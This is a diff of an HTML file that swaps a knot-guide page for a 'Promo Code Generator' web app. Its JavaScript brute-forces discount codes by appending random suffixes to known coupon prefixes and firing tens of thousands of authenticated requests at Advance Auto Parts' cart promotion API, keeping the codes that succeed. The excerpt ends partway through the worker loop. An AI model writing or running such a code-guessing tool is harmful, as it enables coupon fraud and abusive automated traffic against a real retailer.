@@ -3,74 +3,1201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>What Knot To Use? - Visual Guide</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Promo Code Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://apis.google.com/js/api.js"></script> <style>
+        body { font-family: 'Inter', sans-serif; }
+        /* Custom modal styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1000; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 10% auto; /* 10% from the top and centered */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; /* Could be more or less, depending on screen size */
+            max-width: 500px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
+        }
+        .modal-header {
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            font-size: 1.25rem;
+            font-weight: bold;
+        }
+        .modal-body { padding: 15px 0; }
+        .modal-footer {
+            padding-top: 10px;
+            border-top: 1px solid #eee;
+            text-align: right;
+        }
+        .modal-close-btn {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .modal-close-btn:hover,
+        .modal-close-btn:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .log-debug { color: grey; }
+        .log-success { color: green; }
+        .log-warning { color: orange; }
+        .log-error { color: red; font-weight: bold; }
+
+        /* Ensure text area in status bar is vertically aligned and has some padding */
+        #code-output-text-container {
+            display: flex;
+            align-items: center;
+        }
+        #code-output-text {
+            flex-grow: 1;
+            padding: 2px 4px; /* Minimal padding */
+            line-height: 1.2; /* Adjust line height if text is cut off */
+            height: 24px; /* Fixed height for one line */
+            overflow: hidden;
+        }
+    </style>
 </head>
-<body>
+<body class="bg-gray-100 p-4">
 
-    <header>
-        <h1>What Knot To Use?</h1>
-        <p>A visual guide to common knots and their uses.</p>
-    </header>
+    <div class="container mx-auto max-w-6xl bg-white shadow-xl rounded-lg p-6">
+        <h1 class="text-2xl font-bold mb-6 text-center text-blue-600" id="app-title">Promo Code Generator</h1>
 
-    <div id="controls-area">
-        <div id="search-sort-controls">
-            <!-- Search Controls -->
-            <div id="search-controls">
-                <label for="search-input">Search Knots:</label>
-                <input type="search" id="search-input" placeholder="E.g., Bowline, loop, secure...">
-                <button id="clear-search-btn">Clear Search</button>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <div class="md:col-span-1 space-y-6">
+                <div class="border p-4 rounded-lg shadow">
+                    <h2 class="text-lg font-semibold mb-3 text-gray-700">Prefix Selection</h2>
+                    <div class="mb-2">
+                        <label class="block text-sm font-medium text-gray-700">Discount:</label>
+                        <div class="mt-1 flex space-x-4">
+                            <label class="inline-flex items-center">
+                                <input type="radio" class="form-radio" name="discount_value" value="20" checked>
+                                <span class="ml-2">$20</span>
+                            </label>
+                            <label class="inline-flex items-center">
+                                <input type="radio" class="form-radio" name="discount_value" value="10">
+                                <span class="ml-2">$10</span>
+                            </label>
+                        </div>
+                    </div>
+                    <div class="mb-2">
+                        <label for="prefix-dropdown" class="block text-sm font-medium text-gray-700">Prefix:</label>
+                        <select id="prefix-dropdown" class="mt-1 block w-full py-2 px-3 border border-gray-300 bg-white rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
+                            <option>Select...</option>
+                        </select>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2">
+                        <button id="add-prefix-button" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-md text-sm">Add</button>
+                        <button id="remove-prefix-button" class="w-full bg-red-500 hover:bg-red-600 text-white font-semibold py-2 px-4 rounded-md text-sm">Remove</button>
+                    </div>
+                </div>
+
+                <div class="border p-4 rounded-lg shadow">
+                    <h2 class="text-lg font-semibold mb-3 text-gray-700">Configuration</h2>
+                    <div class="mb-3">
+                        <label class="inline-flex items-center">
+                            <input type="checkbox" id="debug-network-checkbox" class="form-checkbox rounded">
+                            <span class="ml-2 text-sm text-gray-700">Debug Network</span>
+                        </label>
+                    </div>
+                    <div class="mb-3">
+                        <label for="max-attempts-entry" class="block text-sm font-medium text-gray-700">Max Attempts/Prefix:</label>
+                        <div class="flex items-center space-x-2 mt-1">
+                            <input type="number" id="max-attempts-entry" value="30000" class="block w-full py-2 px-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
+                            <button id="update-max-attempts-button" class="bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-3 rounded-md text-sm whitespace-nowrap">Update Max</button>
+                        </div>
+                    </div>
+                    <div>
+                        <label for="token-entry" class="block text-sm font-medium text-gray-700">Bearer Token:</label>
+                        <input type="password" id="token-entry" class="mt-1 block w-full py-2 px-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Paste your Bearer token here">
+                    </div>
+                </div>
+
+                <div class="border p-4 rounded-lg shadow">
+                    <h2 class="text-lg font-semibold mb-3 text-gray-700">Google Sheets</h2>
+                     <div class="mb-3">
+                        <label class="inline-flex items-center">
+                            <input type="checkbox" id="update-google-sheets-checkbox" class="form-checkbox rounded">
+                            <span class="ml-2 text-sm text-gray-700">Update Sheet on Check</span>
+                        </label>
+                    </div>
+                    <div class="mb-3">
+                        <label for="spreadsheet-id-entry" class="block text-sm font-medium text-gray-700">Spreadsheet ID:</label>
+                        <input type="text" id="spreadsheet-id-entry" class="mt-1 block w-full py-2 px-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Google Spreadsheet ID">
+                    </div>
+                     <div class="mb-3">
+                        <label for="google-api-key-entry" class="block text-sm font-medium text-gray-700">Google API Key:</label>
+                        <input type="text" id="google-api-key-entry" class="mt-1 block w-full py-2 px-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Your Google API Key">
+                    </div>
+                    <div>
+                        <label for="google-client-id-entry" class="block text-sm font-medium text-gray-700">Google Client ID (for OAuth):</label>
+                        <input type="text" id="google-client-id-entry" class="mt-1 block w-full py-2 px-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Your Google Client ID">
+                    </div>
+                    <button id="google-auth-button" class="mt-3 w-full bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-2 px-4 rounded-md text-sm">Authenticate Google</button>
+                </div>
             </div>
 
-            <!-- Sort Controls -->
-            <div id="sort-controls">
-                <label for="sort-select">Sort by:</label>
-                <select id="sort-select">
-                    <option value="relevance">Relevance (Default)</option>
-                    <option value="name-asc">Name (A-Z)</option>
-                    <option value="name-desc">Name (Z-A)</option>
-                </select>
-            </div>
-        </div>
+            <div class="md:col-span-2 space-y-6 flex flex-col">
+                <div class="border p-4 rounded-lg shadow">
+                    <div class="grid grid-cols-2 gap-3">
+                        <button id="generate-button" class="bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-md">Generate Codes</button>
+                        <button id="stop-button" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-md" disabled>Stop</button>
+                        <button id="check-codes-button" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded-md">Check Valid Codes</button>
+                        <button id="copy-button" class="bg-teal-500 hover:bg-teal-600 text-white font-bold py-3 px-4 rounded-md">Copy Random Code</button>
+                        <button id="clear-button" class="bg-gray-500 hover:bg-gray-600 text-white font-bold py-3 px-4 rounded-md">Clear Output</button>
+                        <button id="paste-test-token-button" class="bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-4 rounded-md">Paste & Test Token</button>
+                    </div>
+                </div>
 
-        <!-- Filter Controls -->
-        <div id="filter-controls-wrapper">
-            <div id="filter-controls">
-                <fieldset class="filter-group">
-                    <legend>Filter by Use Case:</legend>
-                    <button data-filter-group="usecase" data-filter="all" class="active">Show All</button>
-                    <button data-filter-group="usecase" data-filter="joining">Joining Ropes</button>
-                    <button data-filter-group="usecase" data-filter="loop">Loops</button>
-                    <button data-filter-group="usecase" data-filter="hitch">Hitches</button>
-                    <button data-filter-group="usecase" data-filter="stopper">Stopper Knots</button>
-                    <button data-filter-group="usecase" data-filter="binding">Binding Knots</button>
-                </fieldset>
+                <div class="border p-4 rounded-lg shadow flex-grow flex flex-col">
+                    <h2 class="text-lg font-semibold mb-3 text-gray-700">Log</h2>
+                    <div id="output-text" class="flex-grow bg-gray-50 p-2 border border-gray-200 rounded-md overflow-y-auto text-sm" style="min-height: 200px; max-height: 400px;"></div>
+                </div>
 
-                <fieldset class="filter-group" id="characteristic-filter-group">
-                    <legend>Filter by Characteristic:</legend>
-                    <button data-filter-group="characteristic" data-filter="all" class="active">Any</button>
-                    <!-- Characteristic buttons will be dynamically inserted here -->
-                </fieldset>
-            </div>
-            <div id="overall-controls">
-                 <button id="clear-all-filters-btn">Reset All Filters & Sort</button>
+                <div class="border p-3 rounded-lg shadow bg-gray-50">
+                    <div id="attempts-label" class="text-sm text-gray-700 mb-1">Attempts: 0 | Total: 0 | Since Change: 0</div>
+                    <div class="flex items-center text-sm text-gray-700" id="code-output-text-container">
+                        <span class="mr-2">Last Checked/Gen:</span>
+                        <div id="code-output-text" class="bg-gray-200 px-2 py-1 rounded text-xs flex-grow h-6 overflow-hidden"></div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
-    <div id="loading-indicator" class="hidden">Loading knots...</div>
-    <main id="knot-grid">
-        <!-- Knot cards will be dynamically inserted here by script.js -->
-    </main>
+    <div id="genericModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="modal-close-btn" onclick="closeModal('genericModal')">&times;</span>
+                <h2 id="genericModalTitle">Modal Title</h2>
+            </div>
+            <div class="modal-body" id="genericModalBody">
+                <p>Modal content goes here.</p>
+            </div>
+            <div class="modal-footer" id="genericModalFooter">
+                <button class="bg-gray-300 hover:bg-gray-400 text-black py-2 px-4 rounded" onclick="closeModal('genericModal')">Close</button>
+            </div>
+        </div>
+    </div>
 
-    <p id="no-results-message" class="hidden" aria-live="polite">No knots match your current search and filter criteria.</p>
+    <div id="promptModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="promptModalTitle">Prompt</h2>
+            </div>
+            <div class="modal-body">
+                <p id="promptModalMessage" class="mb-2">Enter value:</p>
+                <input type="text" id="promptModalInput" class="w-full p-2 border border-gray-300 rounded">
+            </div>
+            <div class="modal-footer">
+                <button id="promptModalCancel" class="bg-gray-300 hover:bg-gray-400 text-black py-2 px-4 rounded mr-2">Cancel</button>
+                <button id="promptModalOK" class="bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded">OK</button>
+            </div>
+        </div>
+    </div>
 
-    <button id="back-to-top" class="hidden" title="Back to Top">↑</button>
 
-    <footer>
-        <p>Knot information gathered from various sources. Always practice and understand a knot's limitations before relying on it.</p>
-    </footer>
+<script>
+    // --- Constants ---
+    const AAP_URL = 'https://shop.advanceautoparts.com/capi/v42/cart/promotion'; // CORS might be an issue
+    // IMPORTANT: Replace with your actual Bearer Token or implement a secure way to input it.
+    // Hardcoding sensitive tokens in client-side code is a security risk.
+    let bearerToken = "YOUR_BEARER_TOKEN_HERE"; // Placeholder
+    const DEFAULT_SPREADSHEET_ID = "1ke2qsyl6v6XwhkbD-oDFXsflAxUFS7gdmxLNwWZW6ZM"; // Example
+    let DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE = 30000;
+    const REQUEST_TIMEOUT = 10000; // milliseconds
+    const NUM_GENERATION_WORKERS = 2; // Number of async "generation tasks"
+    const NUM_CHECKING_WORKERS = 5; // Number of concurrent checks for existing codes
 
-    <script src="script.js"></script>
+    // Google API Configuration (User must provide these)
+    let GOOGLE_API_KEY = '';
+    let GOOGLE_CLIENT_ID = '';
+    const GOOGLE_SCOPES = 'https://www.googleapis.com/auth/spreadsheets';
+    let googleAuthInstance = null;
+
+
+    // --- Global State ---
+    let isRunning = false;
+    let stopRequested = false;
+    let activeWorkers = 0;
+
+    let attemptsSinceLastFound = 0;
+    let totalAttempts = 0;
+    let attemptsSincePrefixChange = 0; // This will be an aggregate for display
+
+    // --- DOM Elements ---
+    const appTitle = document.getElementById('app-title');
+    const discountValueRadios = document.querySelectorAll('input[name="discount_value"]');
+    const prefixDropdown = document.getElementById('prefix-dropdown');
+    const addPrefixButton = document.getElementById('add-prefix-button');
+    const removePrefixButton = document.getElementById('remove-prefix-button');
+    const debugNetworkCheckbox = document.getElementById('debug-network-checkbox');
+    const maxAttemptsEntry = document.getElementById('max-attempts-entry');
+    const updateMaxAttemptsButton = document.getElementById('update-max-attempts-button');
+    const tokenEntry = document.getElementById('token-entry');
+    const updateGoogleSheetsCheckbox = document.getElementById('update-google-sheets-checkbox');
+    const spreadsheetIdEntry = document.getElementById('spreadsheet-id-entry');
+    const googleApiKeyEntry = document.getElementById('google-api-key-entry');
+    const googleClientIdEntry = document.getElementById('google-client-id-entry');
+    const googleAuthButton = document.getElementById('google-auth-button');
+
+    const generateButton = document.getElementById('generate-button');
+    const stopButton = document.getElementById('stop-button');
+    const checkCodesButton = document.getElementById('check-codes-button');
+    const copyButton = document.getElementById('copy-button');
+    const clearButton = document.getElementById('clear-button');
+    const pasteTestTokenButton = document.getElementById('paste-test-token-button');
+    const outputText = document.getElementById('output-text');
+    const attemptsLabel = document.getElementById('attempts-label');
+    const codeOutputText = document.getElementById('code-output-text');
+
+    // Modal elements
+    const genericModal = document.getElementById('genericModal');
+    const genericModalTitle = document.getElementById('genericModalTitle');
+    const genericModalBody = document.getElementById('genericModalBody');
+    const genericModalFooter = document.getElementById('genericModalFooter');
+
+    const promptModal = document.getElementById('promptModal');
+    const promptModalTitle = document.getElementById('promptModalTitle');
+    const promptModalMessage = document.getElementById('promptModalMessage');
+    const promptModalInput = document.getElementById('promptModalInput');
+    const promptModalOK = document.getElementById('promptModalOK');
+    const promptModalCancel = document.getElementById('promptModalCancel');
+    let promptResolve = null;
+
+
+    // --- LocalStorage Keys ---
+    const LS_PREFIXES_20 = "promoGen_prefixes20";
+    const LS_PREFIXES_10 = "promoGen_prefixes10";
+    const LS_VALID_CODES = "promoGen_validCodes";
+    const LS_BEARER_TOKEN = "promoGen_bearerToken";
+    const LS_SPREADSHEET_ID = "promoGen_spreadsheetId";
+    const LS_GOOGLE_API_KEY = "promoGen_googleApiKey";
+    const LS_GOOGLE_CLIENT_ID = "promoGen_googleClientId";
+    const LS_MAX_ATTEMPTS = "promoGen_maxAttempts";
+
+
+    // --- Utility Functions ---
+    function logMessage(message, level = "INFO") {
+        const timestamp = new Date().toLocaleTimeString();
+        const logEntry = document.createElement('div');
+        logEntry.innerHTML = `[${timestamp}] ${message}`;
+        
+        switch (level.toUpperCase()) {
+            case "DEBUG": logEntry.className = "log-debug"; break;
+            case "SUCCESS": logEntry.className = "log-success"; break;
+            case "WARNING": logEntry.className = "log-warning"; break;
+            case "ERROR": logEntry.className = "log-error"; break;
+            default: break; // INFO
+        }
+        outputText.appendChild(logEntry);
+        outputText.scrollTop = outputText.scrollHeight; // Auto-scroll
+    }
+
+    function updateAttemptsDisplay() {
+        attemptsLabel.textContent = `Attempts: ${attemptsSinceLastFound.toLocaleString()} | Total: ${totalAttempts.toLocaleString()} | Since Change: ${attemptsSincePrefixChange.toLocaleString()}`;
+    }
+
+    function updateCodeDisplay(code) {
+        codeOutputText.textContent = code;
+        codeOutputText.classList.remove('bg-gray-200');
+        codeOutputText.classList.add('bg-white');
+    }
+
+    function resetCodeDisplay() {
+        codeOutputText.textContent = "";
+        codeOutputText.classList.add('bg-gray-200');
+        codeOutputText.classList.remove('bg-white');
+    }
+    
+    function getSelectedDiscount() {
+        return document.querySelector('input[name="discount_value"]:checked').value;
+    }
+
+    function getPrefixesKey() {
+        return getSelectedDiscount() === "10" ? LS_PREFIXES_10 : LS_PREFIXES_20;
+    }
+
+    function loadPrefixes() {
+        const key = getPrefixesKey();
+        const storedPrefixes = localStorage.getItem(key);
+        if (storedPrefixes) {
+            return JSON.parse(storedPrefixes);
+        }
+        // Default prefixes if nothing in localStorage
+        return getSelectedDiscount() === "10" ? ['Select...', 'CPN1258XXXP'] : ['Select...', 'CPN1258772P', 'CPN1258780P', 'CPN1258788P'];
+    }
+
+    function savePrefixes(prefixes) {
+        localStorage.setItem(getPrefixesKey(), JSON.stringify(prefixes));
+    }
+
+    function loadValidCodes() {
+        const storedCodes = localStorage.getItem(LS_VALID_CODES);
+        return storedCodes ? JSON.parse(storedCodes) : [];
+    }
+
+    function saveValidCodes(codes) {
+        localStorage.setItem(LS_VALID_CODES, JSON.stringify(Array.from(new Set(codes)).sort()));
+        updatePrefixDropdown(); // Update bolding
+    }
+
+    function generateRandomSuffix(length = 5) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
+
+    function incrementPrefix(prefix) {
+        try {
+            if (prefix && prefix.length > 4 && prefix.startsWith("CPN") && prefix.endsWith("P")) {
+                const base = prefix.substring(0, 3);
+                const middle = prefix.substring(3, prefix.length - 1);
+                const end = prefix.substring(prefix.length - 1);
+
+                const newMiddleNum = parseInt(middle) + 1;
+                const newMiddleStr = String(newMiddleNum).padStart(middle.length, '0');
+                return base + newMiddleStr + end;
+            }
+            logMessage(`Warning: Cannot increment non-standard prefix format: ${prefix}`, "WARNING");
+            return prefix;
+        } catch (e) {
+            logMessage(`Warning: Could not parse numerical part of prefix: ${prefix}`, "WARNING");
+            return prefix;
+        }
+    }
+
+    // --- Modal Management ---
+    function showModal(modalId, title, bodyContent, footerButtons = []) {
+        const modal = document.getElementById(modalId);
+        if (!modal) return;
+
+        const titleEl = modal.querySelector('.modal-header h2') || document.getElementById(`${modalId}Title`);
+        const bodyEl = modal.querySelector('.modal-body') || document.getElementById(`${modalId}Body`);
+        const footerEl = modal.querySelector('.modal-footer') || document.getElementById(`${modalId}Footer`);
+        
+        if (titleEl) titleEl.innerHTML = title;
+        if (bodyEl) bodyEl.innerHTML = bodyContent; // Assumes bodyContent is HTML string
+
+        if (footerEl) {
+            footerEl.innerHTML = ''; // Clear existing buttons
+            if (footerButtons.length > 0) {
+                footerButtons.forEach(btnConfig => {
+                    const button = document.createElement('button');
+                    button.textContent = btnConfig.text;
+                    button.className = btnConfig.classes || 'bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded';
+                    if (btnConfig.isClose) {
+                         button.onclick = () => closeModal(modalId);
+                    } else if (btnConfig.onClick) {
+                         button.onclick = () => { btnConfig.onClick(); if(btnConfig.autoClose !== false) closeModal(modalId); };
+                    }
+                    footerEl.appendChild(button);
+                    if (btnConfig.spacingClass) button.classList.add(btnConfig.spacingClass); else button.classList.add("ml-2");
+                });
+            } else { // Default close button if none provided
+                 const closeButton = document.createElement('button');
+                 closeButton.textContent = 'Close';
+                 closeButton.className = 'bg-gray-300 hover:bg-gray-400 text-black py-2 px-4 rounded';
+                 closeButton.onclick = () => closeModal(modalId);
+                 footerEl.appendChild(closeButton);
+            }
+        }
+        modal.style.display = "block";
+    }
+
+    function closeModal(modalId) {
+        const modal = document.getElementById(modalId);
+        if (modal) modal.style.display = "none";
+        if (modalId === 'promptModal' && promptResolve) {
+            promptResolve(null); // Resolve with null if cancelled
+            promptResolve = null;
+        }
+    }
+
+    function showPrompt(title, message, defaultValue = "") {
+        return new Promise((resolve) => {
+            promptResolve = resolve;
+            promptModalTitle.textContent = title;
+            promptModalMessage.textContent = message;
+            promptModalInput.value = defaultValue;
+            promptModal.style.display = "block";
+            promptModalInput.focus();
+        });
+    }
+
+    promptModalOK.onclick = () => {
+        if (promptResolve) {
+            promptResolve(promptModalInput.value);
+            promptResolve = null;
+        }
+        closeModal('promptModal');
+    };
+
+    promptModalCancel.onclick = () => {
+        if (promptResolve) {
+            promptResolve(null); // Indicate cancellation
+            promptResolve = null;
+        }
+        closeModal('promptModal');
+    };
+
+    function showAlert(title, message) {
+        showModal('genericModal', title, `<p>${message}</p>`);
+    }
+
+    function showConfirm(title, message) {
+         return new Promise((resolve) => {
+            const body = `<p>${message}</p>`;
+            const buttons = [
+                { text: 'Cancel', classes: 'bg-gray-300 hover:bg-gray-400 text-black py-2 px-4 rounded', onClick: () => resolve(false), autoClose: true },
+                { text: 'OK', classes: 'bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded ml-2', onClick: () => resolve(true), autoClose: true }
+            ];
+            showModal('genericModal', title, body, buttons);
+        });
+    }
+
+
+    // --- UI Update & Logic ---
+    function updatePrefixDropdown() {
+        const currentSelection = prefixDropdown.value;
+        prefixDropdown.innerHTML = ''; // Clear existing options
+
+        const prefixes = loadPrefixes();
+        const validCodes = loadValidCodes();
+        let prefixesInUse = new Set();
+        if (prefixes.length > 1 && prefixes[0] !== 'Select...') {
+             const firstActualPrefix = prefixes.find(p => p !== 'Select...');
+             if (firstActualPrefix) {
+                const prefixLen = firstActualPrefix.length;
+                prefixesInUse = new Set(validCodes.map(code => code.substring(0, prefixLen)));
+             }
+        }
+
+
+        if (!prefixes || prefixes.length === 0 || (prefixes.length === 1 && prefixes[0] === 'Select...')) {
+            const opt = document.createElement('option');
+            opt.value = "No Prefixes Available";
+            opt.textContent = "No Prefixes Available";
+            opt.disabled = true;
+            prefixDropdown.appendChild(opt);
+            prefixDropdown.value = "No Prefixes Available";
+            return;
+        }
+        
+        prefixes.forEach(optionText => {
+            const opt = document.createElement('option');
+            opt.value = optionText;
+            opt.textContent = optionText;
+            if (optionText === 'Select...') {
+                // No special styling for "Select..."
+            } else if (prefixesInUse.has(optionText)) {
+                opt.style.fontWeight = 'bold';
+                opt.textContent += " (in use)";
+            }
+            prefixDropdown.appendChild(opt);
+        });
+
+        if (prefixes.includes(currentSelection)) {
+            prefixDropdown.value = currentSelection;
+        } else if (prefixes.length > 0 && prefixes[0] !== 'Select...') {
+            prefixDropdown.value = prefixes.find(p => p !== 'Select...') || prefixes[0];
+        } else if (prefixes.length > 0) {
+             prefixDropdown.value = prefixes[0]; // Should be 'Select...'
+        }
+    }
+
+    async function addPrefixHandler() {
+        const newPrefixRaw = await showPrompt("Add Prefix", "Enter new prefix (e.g., CPN1258872P):");
+        if (newPrefixRaw === null) return; // User cancelled
+
+        const newPrefix = newPrefixRaw.trim().toUpperCase();
+        if (!newPrefix) return;
+
+        if (!(newPrefix.startsWith("CPN") && newPrefix.endsWith("P") && newPrefix.length > 4)) {
+            showAlert("Invalid Format", "Prefix should generally start with CPN, end with P, and have content in between.");
+            return;
+        }
+
+        const prefixes = loadPrefixes();
+        if (!prefixes.includes(newPrefix)) {
+            // Ensure "Select..." is at the beginning if it exists
+            let selectOpt = null;
+            if (prefixes[0] === 'Select...') {
+                selectOpt = prefixes.shift();
+            }
+            
+            prefixes.push(newPrefix);
+            prefixes.sort((a,b) => { // Keep Select... first, then sort others
+                if (a === 'Select...') return -1;
+                if (b === 'Select...') return 1;
+                return a.localeCompare(b);
+            });
+
+            if (selectOpt && prefixes[0] !== 'Select...') {
+                prefixes.unshift(selectOpt);
+            } else if (!selectOpt && prefixes[0] !== 'Select...' && prefixes.length > 0) {
+                // If 'Select...' was not there and list is not empty, add it.
+                // This case might not be needed if 'Select...' is always added initially.
+            }
+
+
+            savePrefixes(prefixes);
+            logMessage(`Added prefix: ${newPrefix}`, "INFO");
+            updatePrefixDropdown();
+            prefixDropdown.value = newPrefix;
+        } else {
+            showAlert("Duplicate", `Prefix '${newPrefix}' already exists.`);
+        }
+    }
+
+    async function removePrefixHandler() {
+        const currentPrefix = prefixDropdown.value;
+        if (!currentPrefix || currentPrefix === "Select..." || currentPrefix === "No Prefixes Available") {
+            showAlert("Information", "Please select a valid prefix to remove.");
+            return;
+        }
+
+        const confirmed = await showConfirm("Remove Prefix", `Are you sure you want to remove the prefix '${currentPrefix}'?`);
+        if (confirmed) {
+            let prefixes = loadPrefixes();
+            const initialLength = prefixes.length;
+            prefixes = prefixes.filter(p => p !== currentPrefix);
+
+            if (prefixes.length < initialLength) {
+                savePrefixes(prefixes);
+                logMessage(`Removed prefix: ${currentPrefix}`, "INFO");
+                updatePrefixDropdown();
+            } else {
+                showAlert("Error", `Prefix '${currentPrefix}' not found in the list (this shouldn't happen).`);
+            }
+        }
+    }
+    
+    function updateMaxAttemptsHandler() {
+        try {
+            const newMax = parseInt(maxAttemptsEntry.value);
+            if (newMax > 0) {
+                DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE = newMax;
+                localStorage.setItem(LS_MAX_ATTEMPTS, newMax);
+                logMessage(`Max attempts per prefix set to ${newMax.toLocaleString()}`, "INFO");
+            } else {
+                logMessage("Max attempts must be a positive integer", "WARNING");
+                maxAttemptsEntry.value = DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE;
+            }
+        } catch (e) {
+            logMessage("Invalid input. Please enter a positive integer for max attempts.", "ERROR");
+            maxAttemptsEntry.value = DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE;
+        }
+    }
+
+    function updateBearerTokenFromEntry() {
+        const newToken = tokenEntry.value.trim();
+        if (newToken) {
+            if (newToken.startsWith("Bearer ")) {
+                bearerToken = newToken;
+            } else {
+                bearerToken = `Bearer ${newToken}`;
+                tokenEntry.value = bearerToken; // Update entry if we added "Bearer "
+            }
+            localStorage.setItem(LS_BEARER_TOKEN, bearerToken);
+            // logMessage("Bearer token updated from entry.", "INFO"); // Optional: can be noisy
+        } else {
+            // If cleared, perhaps remove from localStorage or set to a default placeholder
+            // For now, just updates the in-memory `bearerToken` if entry is non-empty
+        }
+    }
+
+
+    // --- Core API Logic ---
+    async function sendPromoRequest(codeToCheck) {
+        updateBearerTokenFromEntry(); // Ensure latest token is used
+        const headers = {
+            "Accept": "*/*",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.6",
+            "Authorization": bearerToken,
+            "Content-Type": "application/json",
+            // "Origin": "https://shop.advanceautoparts.com", // Might be needed, or might cause issues depending on CORS
+            // "Referer": "https://shop.advanceautoparts.com/",
+            // "Sec-Fetch-Dest": "empty",
+            // "Sec-Fetch-Mode": "cors", // Browser handles this
+            // "Sec-Fetch-Site": "same-origin", // Browser handles this
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", // Example, may not be critical
+            "x-auth-method": "cookie-token", // As in original
+        };
+        const data = { code: codeToCheck };
+        const isDebug = debugNetworkCheckbox.checked;
+
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);
+
+            const response = await fetch(AAP_URL, {
+                method: 'POST',
+                headers: headers,
+                body: JSON.stringify(data),
+                signal: controller.signal
+            });
+            clearTimeout(timeoutId);
+
+            const responseText = await response.text(); // Get text first for debugging
+
+            if (isDebug) {
+                logMessage(`Req ${codeToCheck}: Status ${response.status}`, "DEBUG");
+                const contentPreview = responseText.substring(0, 200) + (responseText.length > 200 ? '...' : '');
+                logMessage(`Resp: ${contentPreview}`, "DEBUG");
+            }
+
+            if (response.status === 200) return "VALID";
+            if (response.status === 400) {
+                try {
+                    const errorData = JSON.parse(responseText);
+                    if (errorData.errors && errorData.errors[0]) {
+                        const errorMsg = (errorData.errors[0].errorMessage || "").toLowerCase();
+                        const errorName = errorData.errors[0].name || "";
+                        if (errorName === "DuplicatePromoCodeError") {
+                             logMessage(`Code ${codeToCheck}: Duplicate error (likely concurrency). Keeping code.`, "WARNING");
+                             return "DUPLICATE"; // Treat as potentially valid if API has race conditions
+                        }
+                        if (errorMsg.includes("promotion code is not valid") || errorMsg.includes("expired")) {
+                            return "INVALID";
+                        }
+                        logMessage(`Code ${codeToCheck}: 400 Bad Request: ${errorMsg}`, "WARNING");
+                        return "ERROR_API"; // Specific API error
+                    }
+                } catch (e) { /* Ignore JSON parse error if not JSON */ }
+                 if (responseText.toLowerCase().includes('badrequesterror')) return "INVALID"; // Heuristic
+                logMessage(`Code ${codeToCheck}: 400 Bad Request (raw: ${responseText.substring(0,100)})`, "WARNING");
+                return "ERROR_API";
+            }
+            if (response.status === 401 || response.status === 403) return "AUTH_ERROR";
+            
+            logMessage(`Code ${codeToCheck}: Unexpected HTTP Status ${response.status}`, "ERROR");
+            return "ERROR_HTTP";
+
+        } catch (error) {
+            if (error.name === 'AbortError') {
+                logMessage(`Request timed out for code ${codeToCheck}.`, "WARNING");
+                return "TIMEOUT";
+            }
+            logMessage(`Network error checking code ${codeToCheck}: ${error.message}`, "ERROR");
+            return "NETWORK_ERROR";
+        }
+    }
+
+    // --- Generation Logic ---
+    async function generationWorker(initialPrefix, workerLogId) {
+        logMessage(`Worker ${workerLogId} started with prefix ${initialPrefix}.`, "INFO");
+        let currentPrefix = initialPrefix;
+        let workerAttemptsSincePrefixChange = 0;
+
+        try {
+            while (!stopRequested) {
+                const generatedCode = currentPrefix + generateRandomSuffix(5);
+                updateCodeDisplay(generatedCode);
+
+                const status = await sendPromoRequest(generatedCode);
+
+                if (stopRequested) break;
+
+                totalAttempts++;
